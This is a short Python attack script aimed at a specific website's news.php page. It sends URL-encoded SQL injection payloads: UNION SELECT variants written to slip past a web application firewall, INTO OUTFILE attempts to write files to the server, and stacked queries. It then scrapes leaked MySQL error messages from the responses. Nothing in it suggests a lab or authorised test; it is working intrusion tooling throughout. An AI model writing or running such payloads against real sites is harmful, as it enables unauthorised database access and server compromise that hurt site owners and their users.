#!/usr/bin/env python3
"""zagroup: try INTO OUTFILE / stack queries (file write needs FILE priv)"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def test(payload, tag):
    u = BASE + "?c=259" + payload
    code, body = fetch(u)
    m = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    print("%-40s code=%s size=%d %s" % (tag, code, len(body), m.group(1)[:120] if m else ""))

# union column count (union blocked by WAF but try case variants)
test("%27%20union%20select%201--%20", "union-1")
test("%27%20UNION%20SELECT%201--%20", "UNION-upper")
test("%27%20union%20all%20select%201--%20", "union-all")
test("%27%20%75nion%20select%201--%20", "union-hex-u")
# outfile
test("%27%20union%20select%201%20into%20outfile%20%27/tmp/t.txt%27--%20", "outfile")
test("%27%20OR%201=1%20into%20outfile%20%27/tmp/z.txt%27--%20", "or-outfile")
# stack
test("%27;select%201--%20", "stack")
